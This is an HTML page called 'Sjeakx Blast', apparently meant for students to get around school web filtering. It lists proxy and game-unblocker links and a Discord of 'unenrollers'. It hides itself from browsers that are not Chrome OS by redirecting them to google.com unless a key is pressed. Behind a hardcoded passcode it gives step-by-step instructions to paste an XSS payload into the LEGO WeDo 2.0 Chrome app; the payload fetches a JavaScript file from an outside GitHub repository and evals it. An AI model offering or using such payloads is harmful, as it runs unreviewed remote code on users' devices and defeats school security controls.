<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sjeakx Blast</title>
    <link href="./style.css" type="text/css" rel="stylesheet">
    <style>
        .hidden {
            display: none;
        }
        .hidden-body {
            visibility: hidden;
            height: 100vh;
            background-color: white;
        }
        /* Overlay styles */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none; /* Initially hidden */
        }

        .confirmation-dropdown {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: none; /* Initially hidden */
            width: 300px;
            z-index: 1001; /* Ensure the popup is on top */
        }

        .passcode-input {
            margin-bottom: 10px;
        }
    </style>
    <script>
        let isPPressed = false;
        let passcodeVerified = false; // Flag to track if passcode is correct

        function checkUserAgent() {
            const userAgent = navigator.userAgent;

            // For non-Chrome OS users
            if (!userAgent.includes("CrOS")) {
                // Initially hide the entire body except for the LegoWeDo button
                document.body.classList.add("hidden-body");

                // Redirect logic after 2 seconds
                const timeoutId = setTimeout(() => {
                    if (!isPPressed) {
                        window.location.href = "https://google.com"; // Redirect to google.com
                    }
                }, 2000);

                // Event listener for "P" key press
                document.addEventListener("keydown", function (event) {
                    if (event.key === "P" || event.key === "p") {
                        event.preventDefault();
                        isPPressed = true;
                        clearTimeout(timeoutId); // Cancel redirect
                        document.body.classList.remove("hidden-body"); // Reveal the content
                        showGameContainer(); // Show the game content and dropdowns
                    }
                });
            } else {
                // For Chrome OS users, show the content immediately
                document.body.classList.remove("hidden-body");
                showGameContainer();
            }
        }

        function showGameContainer() {
            document.querySelector(".game-container").classList.remove("hidden");
            document.querySelector(".header").classList.remove("hidden");
            document.querySelectorAll(".dropdown").forEach(dropdown => {
                dropdown.classList.remove("hidden"); // Show all dropdowns
            });
            loadGameContent(); // Load the game content from GitHub
        }

        async function loadGameContent() {
            const url = 'https://raw.githubusercontent.com/Sjeakx/sjeak-update/refs/heads/main/updates.txt'; // Replace with your raw URL
            try {
                const response = await fetch(url);
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                const text = await response.text();
                document.getElementById('gameContent').textContent = text; // Set the fetched content
            } catch (error) {
                console.error('Failed to fetch content:', error);
                document.getElementById('gameContent').textContent = 'Error loading game content.';
            }
        }

        window.onload = checkUserAgent; // Run the check when page is loaded

        // Show the LegoWeDo confirmation popup
        function showConfirmation() {
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('confirmationDropdown').style.display = 'block';
        }

        // Close the LegoWeDo confirmation popup
        function closeConfirmation() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('confirmationDropdown').style.display = 'none';
        }

        // Verify passcode and show instructions if correct
        function verifyPasscode() {
            const passcodeInput = document.getElementById('passcodeInput').value;
            const correctPasscode = '1234'; // Set your passcode here

            if (passcodeInput === correctPasscode) {
                passcodeVerified = true;
                document.getElementById('instructions').style.display = 'block'; // Show the instructions
                document.getElementById('passcodeError').style.display = 'none'; // Hide error message
            } else {
                document.getElementById('passcodeError').style.display = 'block'; // Show error message
            }
        }
    </script>
</head>
<body>
    <h1 class="header hidden">Sjeakx Blast</h1>
    
    <!-- Dropdown button container -->
    <div class="button-container">
        <div class="dropdown hidden">
            <button class="custom-btn btn-3">Blocked Games</button>
            <div class="dropdown-content hidden">
                <a href="https://macvg-sjeakx.vercel.app/" target="_blank">macvg (use unblocker)</a>
                <a href="https://nettleweb-sjeakx.vercel.app/" target="_blank">nettleweb (use unblocker)</a>
            </div>
        </div>
        <div class="dropdown hidden">
            <button class="custom-btn btn-3">blocked Proxys</button>
            <div class="dropdown-content hidden">
                <a href="https://sjeakxweb.vercel.app/" target="_blank">Proxy (use unblocker)</a>
                <a href="https://statistical-marla-sjeaks-97f6e201.koyeb.app//" target="_blank">holy unblocker(use unblocker)</a>
            </div>
        </div>
        </div>
        <div class="dropdown hidden">
            <button class="custom-btn btn-3">unblocked Proxys</button>
            <div class="dropdown-content hidden">
                <a href="https://school.accesscam.org/" target="_blank">Proxy (use unblocker)</a>
            </div>
        </div>
        <div class="dropdown hidden">
            <button class="custom-btn btn-3">Unblocked Games</button>
            <div class="dropdown-content hidden">
                <a href="https://sjeakx.github.io/Sjeakx-blast/telltaleheartscript-backup-main/index.html" target="_blank">Unblocker/Games/Emulators</a>
            </div>
        </div>
                <div class="dropdown hidden">
            <button class="custom-btn btn-3">Cool things(blocked)</button>
            <div class="dropdown-content hidden">
                <a href="https://anura.pro/" target="_blank">A fake chrome os</a>
                <a href="https://discord.gg/Gre4NYvv" target="_blank">discord full of unblockers/other websites/unenrollers </a>
                <a href="hhttps://statistical-marla-sjeaks-97f6e201.koyeb.app/" target="_blank">games/poxy/emulators advanced</a>
            </div>
        </div>

        <button class="custom-btn btn-3" onclick="showConfirmation()">LegoWeDo 2.0 (Unblocker)</button>
    </div>

    <!-- Overlay for popup -->
    <div class="overlay hidden" id="overlay"></div>

    <!-- Confirmation popup for LegoWeDo -->
    <div class="confirmation-dropdown hidden" id="confirmationDropdown">
        <h3>Enter Passcode:</h3>
        <input type="password" id="passcodeInput" class="passcode-input" placeholder="Enter passcode">
        <button onclick="verifyPasscode()">Verify</button>
        <p id="passcodeError" style="color: red; display: none;">Incorrect passcode. Please try again.</p>

        <div id="instructions" style="display: none;">
            <h3>Setup you have to do this each time :</h3>
            <p>First, install WeDo 2.0 LEGOÂ® Education from the Chrome Webstore.</p>
            <p>Once you are in the project, click on the pencil in the top bar.</p>
            <p>Then, click the green document button.</p>
            <p>In the textbox, paste the following string:</p>
            
            <div class="code-snippet-wrapper">
                <pre><code>&lt;img src=# onerror='fetch
    ("https://raw.githubusercontent.com
    /Blobby-Boi/BlobbypassXSS/main/main.js")
    .then(r=>r.text())
    .then(c=>eval(c)) '&gt;</code></pre>
            </div>
            <p>Done!</p>

            <button class="confirm-btn" onclick="closeConfirmation()">Got it, close</button>
        </div>
    </div>

    <div class="game-container hidden">
        <h2>Sjeakx Blast update information</h2>
        <p id="gameContent">Here is your game content or information.</p>
    </div>
</body>
</html>
